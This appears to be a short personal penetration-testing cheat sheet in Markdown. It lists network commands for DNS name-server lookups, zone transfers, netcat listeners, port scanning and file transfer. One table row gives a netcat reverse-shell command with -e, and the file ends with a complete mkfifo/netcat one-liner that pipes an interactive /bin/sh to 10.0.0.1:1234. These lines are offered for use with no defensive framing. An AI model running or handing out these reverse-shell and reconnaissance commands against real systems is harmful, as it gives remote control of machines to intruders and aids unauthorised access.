# rtfm

## network

<table>
  <tr>
    <th>command</th>
	<th>description</th>
  </tr>
  <tr>
    <td>host -t ns <i>domain</i></td>
    <td>ask the name servers for a domain</td>
  </tr>
  <tr>
    <td>host -l <i>domain nameServer</i></td>
    <td>dns zone transfer</td>
  </tr>
  <tr>
    <td>nc <i>ip port</i> -e <i>shell</i></td>
    <td>start reverse shell: cmd.exe, /bin/sh</td>
  </tr>
  <tr>
    <td>nc -l -p <i>port</i></td>
    <td>start listener</td>
  </tr>
  <tr>
    <td>nc -v -n -z -w1 <i>ip startPort</i> - <i>endPort</i></td>
    <td>tcp port scanner</td> 
  </tr>
  <tr>
    <td>nc -l -p <i>port fileName</i><br>nc -w3 <i>ip port fileName</i></td>
    <td>file transfers</td>
  </tr>
</table>


```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbMTY5MTM4Njc5MCwyMTg5MDE2ODQsLTE3Mj
I0NTA0MDMsLTE5NjY1ODg1MTVdfQ==
-->